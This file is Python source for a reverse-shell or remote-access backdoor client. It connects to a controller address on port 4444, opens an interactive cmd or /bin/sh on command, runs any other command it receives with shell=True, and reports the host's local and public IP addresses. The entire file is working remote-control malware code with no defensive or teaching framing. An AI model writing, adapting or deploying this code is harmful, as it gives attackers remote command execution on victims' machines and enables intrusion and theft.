import os
import socket
import subprocess
import threading
import struct
import urllib.request
import json


IP = "127.0.0.1"
PORT = 4444
shell = None

def execute_command(cmd):
    """Executes received commands and returns the output."""
    global shell
    try:
        if cmd.lower() == "opencmd":
            if os.name == "nt":
                shell = subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            else:
                shell = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return "Shell started"
        elif shell:
            if cmd.lower() == "exit":
                shell.stdin.write("exit\n")
                shell.stdin.flush()
                shell = None
                return "Shell closed"
            
            shell.stdin.write(cmd + "\n")
            shell.stdin.flush()
            output = shell.stdout.readline()
            return output
    
            
        elif cmd.lower() == "getip":
            lip = str(socket.gethostbyname(socket.gethostname()))
            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            data = json.loads(res.read().decode())
            pip = data.get('ip', 'Unknown')
            output = {
                "pip":pip,
                "lip":lip
            }
            return json.dumps(output)

        elif cmd.lower() == "download":
            return f"{cmd} functionality to be implemented later."
        
        elif cmd.lower() == "upload":
            return f"{cmd} functionality to be implemented later."
        
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr

    except Exception as e:
        return f"Error: {e}"
    

def handle_server_commands(sock):
    """Receives commands from server and sends back output."""
    while True:
        try:
            cmd = sock.recv(1024).decode().strip()
            if not cmd:
                break

            output = str(execute_command(cmd))  
            #print("Output: ",output)
            if cmd.lower() in ["getip"]: 
                sock.sendall(output.encode())  
            else: 
                sock.sendall(struct.pack('>I', len(output.encode())) + output.encode())

        except (Exception, socket.error) as e:
            sock.sendall(f"Error: {e}".encode())
            break
    socket.close()

def start_client(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))

        print(f"Connected to {ip}:{port}")

        thread = threading.Thread(target=handle_server_commands, args=(sock,))
        thread.daemon = True
        thread.start()

        thread.join()
    except KeyboardInterrupt:
        sock.close()

if __name__ == "__main__":
    start_client(IP, PORT)
